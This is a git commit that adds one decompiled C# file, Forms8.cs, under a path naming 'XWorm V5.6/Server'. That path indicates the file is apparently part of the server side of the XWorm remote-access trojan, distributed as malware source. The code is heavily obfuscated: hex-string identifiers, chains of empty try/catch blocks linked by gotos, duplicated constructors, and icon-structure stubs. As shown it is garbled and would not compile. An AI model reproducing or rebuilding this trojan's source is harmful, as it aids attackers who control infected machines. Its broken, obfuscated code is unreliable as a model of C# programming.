81e495d4afa095f32562f352091465eacd13a9ff
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:52:09 +0400

    Forms8.cs

---
+++ XWorm V5.6/Server/Forms/Forms8.cs
@@ -0,0 +1,306 @@
+﻿using DCF5626620B93114F5EA3D2F3037B9D5;
+using DE71DAF09175D9F0B87B5C9ADD611E6D;
+using M5E7485F8B1A1AD7481M48DMCMC4A3DC;
+using M91M4ECFDDM3DME6A47137F5C799218A;
+using M95F4E5MF7905418B3E7M3BBMCM33E92;
+using MEA9MCF25F24475D52DDBEE8F296A691;
+using System;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Security;
+
+namespace E037E712D0B67F6E889EC42DC0AC1807
+{
+  public class B2EDAEE66304DD9AEE6F9323BD35B8DD
+  {
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public B2EDAEE66304DD9AEE6F9323BD35B8DD() => throw new Exception("が");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void E904BF05ABDF06F27AFEE8541A247D48(
+      FE2B86A9D832C0656F97BF8FC7D65AE7 C,
+      byte[] b)
+    {
+      try
+      {
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_3:;
+        }
+        goto label_3;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_5:;
+        }
+        goto label_5;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_7:;
+        }
+        goto label_7;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_9:;
+        }
+        goto label_9;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_11:;
+        }
+        goto label_11;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_13:;
+        }
+        goto label_13;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_15:;
+        }
+        goto label_15;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_17:;
+        }
+        goto label_17;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_19:;
+        }
+        goto label_19;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_21:;
+        }
+        goto label_21;
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_23:;
+        }
+        goto label_23;
+        try
+        {
+          try
+          {
+          }
+          catch (Exception ex)
+          {
+label_26:
+            goto label_27;
+          }
+          goto label_26;
+        }
+        catch (Exception ex)
+        {
+label_27:;
+        }
+        try
+        {
+        }
+        finally
+        {
+label_29:
+          goto label_30;
+        }
+        goto label_29;
+label_30:
+        try
+        {
+        }
+        finally
+        {
+label_31:
+          goto label_32;
+        }
+        goto label_31;
+label_32:
+        try
+        {
+        }
+        finally
+        {
+label_33:
+          goto label_34;
+        }
+        goto label_33;
+label_34:
+        try
+        {
+        }
+        finally
+        {
+label_35:
+          goto label_36;
+        }
+        goto label_35;
+label_36:
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_37:
+          goto label_38;
+        }
+        goto label_37;
+      }
+      catch (Exception ex)
+      {
+label_38:
+        throw new Exception("ぃ");
+      }
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public B2EDAEE66304DD9AEE6F9323BD35B8DD() => throw new Exception("ホ");
+
+    [SuppressUnmanagedCodeSecurity]
+    private class NativeMethods
+    {
+      [DebuggerHidden]
+      [SpecialName]
+      internal void _Lambda\u0024__R13(object a0) => ((M5D21ECED72ME2727DF3B0M1DC743CC6) ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_5).A0971C0149162C7886175E2F76907783((byte[]) a0);
+
+      public NativeMethods(
+        D0390509B52C44661FC1BBD32C057C4B._Closure\u0024__R5\u002D4 arg0)
+      {
+        if (arg0 == null)
+          return;
+        ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_6 = ((FE2B86A9D832C0656F97BF8FC7D65AE7) arg0).\u0024VB\u0024NonLocal_6;
+      }
+
+      [DebuggerHidden]
+      [SpecialName]
+      internal void _Lambda\u0024__R14(object a0) => ((M5D21ECED72ME2727DF3B0M1DC743CC6) ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_6).A0971C0149162C7886175E2F76907783((byte[]) a0);
+
+      public NativeMethods(
+        D0390509B52C44661FC1BBD32C057C4B._Closure\u0024__R5\u002D5 arg0)
+      {
+        if (arg0 == null)
+          return;
+        ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_7 = ((FE2B86A9D832C0656F97BF8FC7D65AE7) arg0).\u0024VB\u0024NonLocal_7;
+      }
+    }
+
+    private struct ICONDIR
+    {
+      public static int D7C4AA09C0850E73CD8A9DF296BFF950;
+      public static int D2DFCD3F698298703F70BA8537EDD895;
+      public static int AD0367EDE660056877FDFF3970A1FA15;
+    }
+
+    private struct ICONDIRENTRY
+    {
+      public static int D4FF0D6EB9E119A3D08C008AB8483DA9;
+      public static int D6DB0B906949D7D28B44B134DCAD9062;
+      public static int DC21E9E1A455AD91A9E8561147D6BD3F;
+      public static int FED0308E24939562FF3CD0ECFB068839;
+      public static int A82DD1199AF8FA553748823E79EA09C3;
+      public static int BAD432E2831E28BCF8016220D20C0E18;
+      public static int D0D22B2D934AE0B9413DD0D3A964D89B;
+      public static int DDD6CFDA44CC6DD68DC0CA78F4D25CFC;
+    }
+
+    private struct BITMAPINFOHEADER
+    {
+      public static int D1494267FDDD27B45D6EDC6B096E42A5;
+      public static int D4E3DD66D4B63AACB9B3A7B6F2FD37D8;
+      public static int D3D79AFEA3F8C9F6BCD6D862CEE5D54A;
+      public static int ED47024F1CE0CE935407165933B78446;
+      public static int D1C77D8E1B420E4D51E252ED427AD525;
+      public static int D79F14FE889A0C0DDAFE8D5C4A44C2D7;
+      public static int D0D0898D2EEF989FCE5EC004DFF88B8D;
+      public static int DD903B9CD5336B094DD3DFAF5F46681F;
+      public static int DBFF9D705C7A0B7EDB0271AD95088356;
+      public static int D50CD02200FAC1CA5D1E3E40DCCE2CDD;
+      public static int D4F7E0EDF59DCED934BEAA45C931184D;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 2)]
+    private struct GRPICONDIRENTRY
+    {
+      public static int D03C9DB89FE7B06A27D3B7E8B704F666;
+      public static int BCE5E579A9FEF5E94D122F8842E57565;
+      public static int B044E297EE7B1553F30750FA410AA089;
+      public static int DFD5CC1E141F40F9D84448D344B1B4C7;
+      public static int D082CD3FC9D8BC4A32223EDD20237FDE;
+      public static int DC74177D89CDDE5FD306F1515A98D681;
+      public static int D395BFF1F7AC1877CD24BCD9EE8E75D0;
+      public static int DEC13FF2568843A2EF8D11FA2B51259D;
+    }
+
+    private class IconFile
+    {
+      public static int DD7035C12F627CAE460FBA03487DC7B1;
+      public static int DABDBADBAD3AA46226B31256C9E44A4A;
+      public static int DDCCE4FBA44F0687E063146894CB2DD2;
+
+      public int ImageCount
+      {
+        [SpecialName] get => (int) (^(D40EC4297AB137B17D850F2F00931D78&) ref ((D61DC9BD4E3D19AC32CBBA9128ADDEFC) this).iconDir).Count;
+      }
+
+      [DebuggerHidden]
+      [SpecialName]
+      internal void _Lambda\u0024__R15(object a0) => ((M5D21ECED72ME2727DF3B0M1DC743CC6) ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_7).A0971C0149162C7886175E2F76907783((byte[]) a0);
+
+      public IconFile(
+        D0390509B52C44661FC1BBD32C057C4B._Closure\u0024__R5\u002D6 arg0)
+      {
+        if (arg0 == null)
+          return;
+        ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_8 = ((FE2B86A9D832C0656F97BF8FC7D65AE7) arg0).\u0024VB\u0024NonLocal_8;
+      }
+
+      [DebuggerHidden]
+      [SpecialName]
+      internal void _Lambda\u0024__R16(object a0) => ((M5D21ECED72ME2727DF3B0M1DC743CC6) ((FE2B86A9D832C0656F97BF8FC7D65AE7) this).\u0024VB\u0024NonLocal_8).A0971C0149162C7886175E2F76907783((byte[]) a0);
+
+      public IconFile(
+        D0390509B52C44661FC1BBD32C057C4B._Closure\u0024__R5\u002D7 arg0)
+      {
+        if (arg0 == null)
+          return;
+        ((F37068503FD78A2484752A672949A328) this).\u0024VB\u0024NonLocal_9 = ((F37068503FD78A2484752A672949A328) arg0).\u0024VB\u0024NonLocal_9;
+      }
+
+      [DebuggerHidden]
+      [SpecialName]
+      internal void _Lambda\u0024__R17(object a0) => ((M5D21ECED72ME2727DF3B0M1DC743CC6) ((F37068503FD78A2484752A672949A328) this).\u0024VB\u0024NonLocal_9).A0971C0149162C7886175E2F76907783((byte[]) a0);
+    }
+  }
+}
